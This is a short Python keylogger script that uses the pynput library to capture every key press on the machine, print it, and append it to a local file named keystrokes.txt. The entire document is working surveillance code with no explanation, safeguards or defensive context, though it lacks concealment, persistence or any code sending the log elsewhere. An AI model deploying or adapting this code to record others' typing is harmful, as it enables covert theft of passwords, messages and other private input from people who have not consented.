from pynput import keyboard


def keystroke(key):
    print(str(key))
    with open("keystrokes.txt", "a") as logkeys:
        try:
            char = str(key)
            logkeys.write(char)
        except:
            print("Error hooking char")
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keystroke)
    listener.start()
    input()
 